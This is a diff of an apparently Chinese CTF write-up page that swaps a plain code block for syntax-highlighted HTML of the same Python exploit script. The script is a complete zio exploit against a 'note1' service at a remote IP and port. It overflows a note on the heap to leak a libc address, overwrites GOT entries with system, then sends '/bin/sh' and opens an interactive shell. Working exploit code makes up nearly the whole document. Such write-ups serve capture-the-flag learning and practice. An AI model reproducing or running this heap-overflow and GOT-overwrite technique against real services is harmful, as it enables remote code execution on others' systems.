@@ -154,63 +154,62 @@
 
 <h3>代码</h3>
 
-<pre><code>from zio import *
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
 
-def new_note(title, type_str, content):
-    io.read_until('option---')
-    io.writeline('1')
-    io.read_until('title:')
-    io.writeline(title)
-    io.read_until('type:')
-    io.writeline(type_str)
-    io.read_until('content:')
-    io.writeline(content)
+<span class="k">def</span> <span class="nf">new_note</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">type_str</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;option---&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;type:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">type_str</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;content:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
-def edit_note(title, content):
-    io.read_until('option---')
-    io.writeline('3')
-    io.read_until('title:')
-    io.writeline(title)
-    io.read_until('content:')
-    io.writeline(content)
+<span class="k">def</span> <span class="nf">edit_note</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;option---&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;content:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
-def show_note():
-    io.read_until('option---')
-    io.writeline('2')
+<span class="k">def</span> <span class="nf">show_note</span><span class="p">():</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;option---&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
 
-def del_note(title):
-    io.read_until('option---')
-    io.writeline('4')
-    io.read_until('title:')
-    io.writeline(title)
+<span class="k">def</span> <span class="nf">del_note</span><span class="p">(</span><span class="n">title</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;option---&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">title</span><span class="p">)</span>
 
-def main():
-    new_note('a','a','a')
-    new_note('b','b','b')
-    new_note('c','c','c')
-    show_note()
-    junk = 'a'*256 + "\x00"*8 + l64(0x181)
-    content = junk + l64(0) + l64(0x601fe8)
-    edit_note('b', content)
-    # io.gdb_hint()
-    show_note()
-    io.read_until('content')
-    io.read_until('content')
-    tmp = io.read_until('1.New')[1:-1*len('1.New')-1][::-1]
-    system_addr = int('0x'+tmp.encode('hex'), 16) - 0x3c110
-    log(hex(system_addr), color='red')
-    setvbuf_addr = l64(system_addr + 0x2a030)
-    del_note('')
-    edit_note('', l64(0x3c110+system_addr) + setvbuf_addr+l64(system_addr))
-    io.read_until('option')
-    io.writeline('/bin/sh')
-    io.interact()
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">new_note</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">,</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
+    <span class="n">new_note</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span><span class="s">&#39;b&#39;</span><span class="p">,</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
+    <span class="n">new_note</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">,</span><span class="s">&#39;c&#39;</span><span class="p">,</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
+    <span class="n">show_note</span><span class="p">()</span>
+    <span class="n">junk</span> <span class="o">=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">256</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x181</span><span class="p">)</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x601fe8</span><span class="p">)</span>
+    <span class="n">edit_note</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+    <span class="c"># io.gdb_hint()</span>
+    <span class="n">show_note</span><span class="p">()</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;content&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;content&#39;</span><span class="p">)</span>
+    <span class="n">tmp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;1.New&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="s">&#39;1.New&#39;</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&#39;0x&#39;</span><span class="o">+</span><span class="n">tmp</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3c110</span>
+    <span class="n">log</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span> <span class="n">color</span><span class="o">=</span><span class="s">&#39;red&#39;</span><span class="p">)</span>
+    <span class="n">setvbuf_addr</span> <span class="o">=</span> <span class="n">l64</span><span class="p">(</span><span class="n">system_addr</span> <span class="o">+</span> <span class="mh">0x2a030</span><span class="p">)</span>
+    <span class="n">del_note</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>
+    <span class="n">edit_note</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">,</span> <span class="n">l64</span><span class="p">(</span><span class="mh">0x3c110</span><span class="o">+</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">setvbuf_addr</span><span class="o">+</span><span class="n">l64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;option&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
 
-if __name__ == '__main__':
-    # io = zio('./note1')
-    io = zio(('115.28.206.86',9001))
-    main()
-</code></pre>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="c"># io = zio(&#39;./note1&#39;)</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="s">&#39;115.28.206.86&#39;</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
+    <span class="n">main</span><span class="p">()</span></code></pre></figure>
 
     </div>
 
